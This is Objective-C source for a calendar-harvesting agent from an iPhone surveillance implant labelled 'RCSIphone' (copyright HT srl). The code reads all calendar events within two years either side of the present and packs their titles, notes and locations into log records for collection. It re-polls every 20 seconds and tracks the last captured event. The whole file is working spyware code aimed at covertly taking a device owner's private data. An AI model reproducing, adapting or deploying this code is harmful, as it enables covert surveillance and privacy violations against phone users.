//
//  RCSIAgentCalendar.m
//  RCSIphone
//
//  Created by kiodo on 04/08/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import "RCSIAgentCalendar.h"
#import "RCSICommon.h"
#import "EventKit.h"
#import "RCSILogManager.h"

//#define DEBUG_CAL

NSDate *gStartDate, *gEndDate;

NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";

@implementation RCSIAgentCalendar

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData*)aData
{
  self = [super initWithConfigData: aData];
  
  if (self != nil)
    {
      mLastEvent = 0;
      mAgentID   = AGENT_ORGANIZER;
    }
  
  return self;
}

#pragma mark -
#pragma mark support methods
#pragma mark -

- (BOOL)_setAgentMessagesProperty
{
  NSAutoreleasePool *pool   = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *eventDateDict = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithDouble: mLastEvent], nil] 
                                                              forKeys: [NSArray arrayWithObjects: @"LAST_EVENT_DATE", nil]];
  
  NSDictionary *agentDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: eventDateDict, nil]
                                                              forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [eventDateDict release];
   
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentMessagesProperty
{
  NSDictionary *agentDict = nil;

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  agentDict = rcsPropertyWithName([[self class] description]);

  if (agentDict == nil) 
    {
      return YES;
    }

  NSNumber *lastEventDate = (NSNumber*)[agentDict objectForKey: @"LAST_EVENT_DATE"];


  mLastEvent = [lastEventDate doubleValue];

  [agentDict release];
  
  [outerPool release];

  return YES;
}

- (NSDate*)initStartDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  CFGregorianDate gregorianStartDate;
  CFGregorianUnits startUnits = {0, 0, -730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
  
  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                      timeZone, 
                                                                                      startUnits),
                                                      timeZone);
  gregorianStartDate.hour = 0;
  gregorianStartDate.minute = 0;
  gregorianStartDate.second = 0;
  
  
  NSDate *theDate =
  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianStartDate, timeZone)];
  
  [theDate retain];
  
  CFRelease(timeZone);
  
  [pool release];
  
  return theDate;
}

- (NSDate*)initEndDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  CFGregorianDate gregorianEndDate;
  CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
  
  
  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                    timeZone, 
                                                                                    endUnits),
                                                    timeZone);
  gregorianEndDate.hour = 0;
  gregorianEndDate.minute = 0;
  gregorianEndDate.second = 0;

  NSDate *theDate =
  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianEndDate, timeZone)];
  
  [theDate retain];
  
  CFRelease(timeZone);
  
  [pool release];
  
  return theDate;
  
}

- (void)calcStartAndEndDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  CFGregorianDate gregorianStartDate, gregorianEndDate;
  CFGregorianUnits startUnits = {0, 0, -730, 0, 0, 0};
  CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();

  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                      timeZone, 
                                                                                      startUnits),
                                                      timeZone);
  gregorianStartDate.hour = 0;
  gregorianStartDate.minute = 0;
  gregorianStartDate.second = 0;

  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                    timeZone, 
                                                                                    endUnits),
                                                    timeZone);
  gregorianEndDate.hour = 0;
  gregorianEndDate.minute = 0;
  gregorianEndDate.second = 0;

  gStartDate =
    [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianStartDate, timeZone)];
  gEndDate =
    [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianEndDate, timeZone)];

  [gStartDate retain];
  [gEndDate retain];

  CFRelease(timeZone);

  [pool release];
}

- (void)writeCalLog: (EKEvent*)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  UInt32 prefix = 0;
  UInt32 outLength = 0;
  HeaderStruct header;
  HeaderStruct *tmpHeader = NULL;
  PoomCalendar calStruct;

  NSMutableData *calData = [[NSMutableData alloc] initWithCapacity: 0];

  memset(&header, 0, sizeof(HeaderStruct));
  memset(&calStruct, 0, sizeof(PoomCalendar));

  header.dwVersion = POOM_V1_0_PROTO;
  outLength = sizeof(HeaderStruct);

  // FLAGS + StartDate + EndDate + 5 Long
  outLength += sizeof(calStruct);

  int64_t filetime = ((int64_t)[[anEvent startDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftStartDateHi = filetime >> 32;
  calStruct._ftStartDateLo = filetime & 0xFFFFFFFF;

  filetime = ((int64_t)[[anEvent endDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftEndDateHi = filetime >> 32;
  calStruct._ftEndDateLo = filetime & 0xFFFFFFFF;

  [calData appendBytes: (const void *) &header length: sizeof(header)];
  [calData appendBytes: (const void *) &calStruct length:sizeof(PoomCalendar)];

  // Recursive
  // memcpy_s(pPtr, sizeof(RecurStruct), calendar->GetRecurStruct(), sizeof(RecurStruct));

  //POOM_STRING_SUBJECT
  if ([anEvent title]) 
    {
      char * tmpString = (char*)[[anEvent title] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent title] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);

          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_SUBJECT; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  //POOM_STRING_CATEGORIES
  //prefix = 0;
  //prefix &= POOM_TYPE_MASK;    
  //prefix |= (UInt32)POOM_STRING_CATEGORIES;

  //POOM_STRING_BODY
  if ([anEvent notes]) 
    {
      char * tmpString = (char*)[[anEvent notes] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent notes] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);
          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_BODY; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  //POOM_STRING_RECIPIENTS
  //prefix = 0;
  //prefix &= POOM_TYPE_MASK;    
  //prefix |= (UInt32)POOM_STRING_RECIPIENTS;

  //POOM_STRING_LOCATION
  if ([anEvent location]) 
    {
      char * tmpString = (char*)[[anEvent location] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent location] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);
          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_LOCATION; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  // Setting total length
  tmpHeader = (HeaderStruct *) [calData bytes];  
  tmpHeader->dwSize = outLength;

  RCSILogManager *logManager = [RCSILogManager sharedInstance];

  BOOL success = [logManager createLog: LOG_CALENDAR
                           agentHeader: nil
                             withLogID: 0];
  // Write data to log
  if (success == TRUE && [logManager writeDataToLog: calData
                                           forAgent: LOG_CALENDAR
                                          withLogID: 0] == TRUE)
    {
      [logManager closeActiveLog: LOG_CALENDAR withLogID: 0];

      if ([[anEvent lastModifiedDate] timeIntervalSince1970] > mLastEvent)
        {
          mLastEvent = [[anEvent lastModifiedDate] timeIntervalSince1970];
          [self _setAgentMessagesProperty];
        }
    }

  [calData release];

  [pool release];
}

- (NSArray*)getEvents: (NSDate*)startDate
               toDate: (NSDate*)endDate
{
  EKEventStore *eStore = [[EKEventStore alloc] init];

  NSPredicate *predicate = [eStore predicateForEventsWithStartDate:startDate endDate:endDate calendars:nil];

  NSArray *events = [eStore eventsMatchingPredicate: predicate];

  [eStore release];

  return events;
}

- (void)runParseCalEvents: (BOOL)allEvents withStartDate:(NSDate*)startDate andEndDate:(NSDate*)endDate
{
  UIDevice *device = [UIDevice currentDevice];
  
  NSString *majVer = [[device systemVersion] substringToIndex:1];
  
  if ([majVer compare: @"3"] == NSOrderedSame || [self isThreadCancelled] == TRUE) 
    {
      return;
    }
  
  NSArray *events = [self getEvents: startDate toDate: endDate];
  
  if ([self isThreadCancelled] == TRUE)
    return;
  
  if (events) 
    {
      for (int i=0; i < [events count]; i++) 
        {
          if ([self isThreadCancelled] == TRUE)
            break;
        
          EKEvent *currEvent = (EKEvent*)[events objectAtIndex: i];
          
          NSTimeInterval currDate = [[currEvent lastModifiedDate] timeIntervalSince1970];
          
          if (currDate > mLastEvent || allEvents) 
            {
              [self writeCalLog: currEvent];
            }
        } 
    }
}

- (void)parseCalEvents:(NSTimer*)theTimer
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *eventDict = (NSDictionary*)[theTimer userInfo];
    
  BOOL allEvents    = [[eventDict objectForKey:@"allevents"] boolValue];
  NSDate *startDate = [eventDict objectForKey: @"startDate"];
  NSDate *endDate   = [eventDict objectForKey: @"endDate"];
  
  [self runParseCalEvents: allEvents withStartDate: startDate andEndDate: endDate];

  [pool release];
}

- (void)setCalPollingTimeOut:(NSTimeInterval)aTimeOut 
              withDictionary:(NSDictionary*)theDict
{  
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(parseCalEvents:) 
                                                  userInfo: theDict 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentCalendarRunLoopMode];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self mAgentStatus] != AGENT_STATUS_STOPPED || [self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [outerPool release];
      return;
    }
  
  NSDate *startDate = [self initStartDate];
  NSDate *endDate   = [self initEndDate];
  
  [self _getAgentMessagesProperty];

  if (mLastEvent == 0) 
    {
      mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
      [self runParseCalEvents: YES withStartDate:startDate andEndDate:endDate];
    }
  
  NSNumber *noNum   = [NSNumber numberWithBool: NO];
  
  NSDictionary *allEventDict = 
      [[NSDictionary alloc] initWithObjectsAndKeys:noNum, 
                                                   @"allevents",
                                                   startDate, 
                                                   @"startDate",
                                                   endDate, 
                                                   @"endDate", 
                                                   nil];
  
  [self setCalPollingTimeOut: 20.0 withDictionary: allEventDict];
  
  while([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentCalendarRunLoopMode 
                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];

      [innerPool release];
    }

  [startDate release];
  [endDate release];
  [allEventDict release];
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
